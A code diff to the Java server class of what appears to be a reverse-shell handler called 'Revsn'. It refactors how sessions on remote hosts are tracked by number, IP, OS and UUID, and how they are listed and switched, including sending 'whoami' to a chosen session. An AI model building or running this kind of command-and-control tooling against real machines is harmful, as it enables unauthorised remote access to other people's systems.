@@ -62,13 +62,19 @@ public class Server implements Runnable{
     private volatile Listener listener;
     public volatile ThreadMonitor threadMonitor;
     public volatile int sessionNumber;
-    public int sessNumberStart;
+
+    public volatile ArrayList<String> ips = new ArrayList<>();
+    public volatile ArrayList<Triplet<Mode, Integer, String>> modePortUUID = new ArrayList<>();
+    public volatile ArrayList<CouplePair<String, String>> ipOs = new ArrayList<>();
     
     public static HashMap<Integer, String> sessionNumOsStatic = new HashMap<>();
     public HashMap<Integer, String> sessionNumOs = sessionNumOsStatic;
 
-    public static HashMap<String, String> uuidAndIpSatic = new HashMap<>();
-    public HashMap<String, String> uuidAndIp = uuidAndIpSatic;
+    public static HashMap<Integer, String> sessNumUUIDSatic = new HashMap<>();
+    public HashMap<Integer, String> sessNumUUID = sessNumUUIDSatic;
+
+    public static HashMap<Integer, String> sessIpSt = new HashMap<>();
+    public HashMap<Integer, String> sessIp = sessIpSt;
 
 
     //UUID, OS, sessionLiMap
@@ -88,7 +94,6 @@ public class Server implements Runnable{
 
     public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
         this.sessionNumber = sessionNumber;
-        this.sessNumberStart = sessionNumber;
         
         this.threadMonitor = monitor;
         
@@ -161,7 +166,7 @@ public class Server implements Runnable{
                         case("switch"): 
                             printSwitch();
                             System.out.println("---Enter anything else to leave this menu.---\n");
-                            System.out.print("Revsn [" + shellType + "] ["+ getIp(sessionNumber) +"] » ");
+                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
                             String tmp = bufferedReader.readLine();
                             switch(tmp) {
                                 case("http"): 
@@ -209,7 +214,7 @@ public class Server implements Runnable{
 
                                 }
                             }
-                            System.out.print("Revsn [" + shellType + "] ["+ getIp(sessionNumber) +"] » ");
+                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
                             break;  
                             
                         case("sessions"):
@@ -217,10 +222,10 @@ public class Server implements Runnable{
 
                             System.out.print("Which session you want to interact with? (type 'none' to exit): ");
                             sessionNumber = Integer.parseInt(bufferedReader.readLine());
-                            getHandler(sessionNumber).update("");
-                            
-
+                            System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
+                            message = "whoami";
                             break;
+                            
                         default: 
                             if(shellType.equals("TCP")) {
                                 getHandler(sessionNumber).update(message);
@@ -325,9 +330,6 @@ public class Server implements Runnable{
 
     public static void addSession(String uuid, String os, int sessionNumber) {
 
-        //HashMap<String, HashMap<String, Map<String, Quadmap<Integer, Handler, Mode, Integer>>>> sessions
-
-        //Map<String, Quadmap<Integer, Handler, Mode, Integer>> sessionLiMap
         String ip = sessionLiMap.entrySet().stream()
             .filter(entry -> Objects.equals(entry.getValue().getSessionNumber(), sessionNumber))
             .map(Map.Entry::getKey)
@@ -335,9 +337,6 @@ public class Server implements Runnable{
             .orElse(null);
 
         //Stream<Quadmap<Integer, Handler, Mode, Integer>> quadStream = sessionLiMap.values().stream();
-        loggerS.info("ip: " + ip );
-
-        loggerS.info(ip + "in addSession!");
         Quadmap<Integer, Handler, Mode, Integer> quad = sessionLiMap.get(ip);
 
         Map<String, Quadmap<Integer, Handler, Mode, Integer>> mappi = new ConcurrentHashMap<>();
@@ -346,9 +345,11 @@ public class Server implements Runnable{
         helper.put(os, mappi); 
         
         sessions.put(uuid, helper);
-        loggerS.info("Added" + uuid + "to session list!");
+        loggerS.info("Added Session Nr. " + sessionNumber + " to the session list!");
         sessionNumOsStatic.put(sessionNumber, os);
-        uuidAndIpSatic.put(uuid, ip);
+        sessNumUUIDSatic.put(sessionNumber, uuid);
+        
+
         
     }
 
@@ -362,7 +363,8 @@ public class Server implements Runnable{
 
     public void addHandlerinoSess(String ip, int port, Handler handler, int sessionNumber ) {
         sessionLiMap.put(ip, new Quadmap<Integer, Handler, Mode, Integer>(port, handler, Mode.TCP, sessionNumber));
-        logger.info("Set {} {} {} {} in sessionLiMap success", ip, port, handler, sessionNumber);
+        handlerinos.put(sessionNumber, handler);
+        sessIpSt.put(sessionNumber, ip);
         
         //handlerinos.put(sessionNumber, handler);
     }
@@ -372,53 +374,39 @@ public class Server implements Runnable{
     }
 
     public Handler getHandler(int sessionNumber) {
-        String ip = sessionLiMap.entrySet().stream()
-            .filter(entry -> Objects.equals(entry.getValue().getSessionNumber(), sessionNumber))
-            .map(Map.Entry::getKey)
-            .findFirst()
-            .orElse(null);
-        return sessionLiMap.get(ip).getHandler();
+        return handlerinos.get(sessionNumber);
     }
 
     public String getIp(int sessioNumber) {
-        String ip = sessionLiMap.entrySet().stream()
-            .filter(entry -> Objects.equals(entry.getValue().getSessionNumber(), sessionNumber))
-            .map(Map.Entry::getKey)
-            .findFirst()
-            .orElse(null);
-        return ip;
+        return sessIp.get(sessioNumber);
+    }
+
+    public void addToPrint(int sessNr) {
+        String tmpIp = getIp(sessNr);
+        int tmpPort = getHandler(sessNr).getPort();
+        Mode tmpMode = getHandler(sessNr).getMode();
+        String tmpUUID = sessNumUUID.get(sessNr);
+        String tmpOs = sessionNumOs.get(sessNr);
+
+        ipOs.add(new CouplePair<String,String>(tmpIp, tmpOs));
+        modePortUUID.add(new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
+        System.out.print("Revsn [" + shellType + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
     }
 
 
     public void printSessions() {
-        //HashMap<String, HashMap<String, Map<String, Quadmap<Integer, Handler, Mode, Integer>>>> sessions
-        //UUID, OS, IP, Port, Handler, Mode, Session-ID
-
-        //Map<String, Quadmap<Integer, Handler, Mode, Integer>> sessionLiMap 
-        //IP, Port, Handler, Mode, Integer
-
-        ArrayList<String> ips = new ArrayList<>();
-        ArrayList<Triplet<Mode, Integer, String>> modePortUUID = new ArrayList<>();
-        ArrayList<CouplePair<String, String>> ipOs = new ArrayList<>();
-
-        for(Integer numbers : sessionNumOs.keySet()) {
-            ips.add(getIp(numbers));
-            String tmpIp = getIp(numbers);
-            String tmpOs = sessionNumOs.get(numbers);
-            ipOs.add(new CouplePair<String,String>(tmpIp, tmpOs));
+        int i = 0;
+        System.out.println("---|Session List|---\n|Session Nr.\t|IP\t\t|OS\t|Mode\t|UUID\t\t\t\t\t|");
+        for(Integer sess : sessionNumOs.keySet()) {
+            System.out.println(
+                "|" + sess + "\t\t" +
+                "|" + ipOs.get(i).getKey() + "\t" +
+                "|" + ipOs.get(i).getValue() + "\t" +
+                "|" + modePortUUID.get(i).getKey() + "\t" +
+                "|" + modePortUUID.get(i).getAddition() + "\t" +
+                "|\n");
+            i++;
         }
-        for(String ip : ips) {
-            int tmpPort = sessionLiMap.get(ip).getPort();
-            Mode tmpMode = sessionLiMap.get(ip).getMode();
-            String tmpUUID = "";
-            if(uuidAndIp.values().contains(ip)) {
-                tmpUUID = getKeyByValue(uuidAndIp, ip);
-            }
-            modePortUUID.add(new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
-        }
-
-        //Iterator über beide ArrayListen gleichzeitig und dann schön printen.
-        //https://stackoverflow.com/questions/15985266/how-to-iterate-through-two-arraylists-simultaneously
 
     }
 
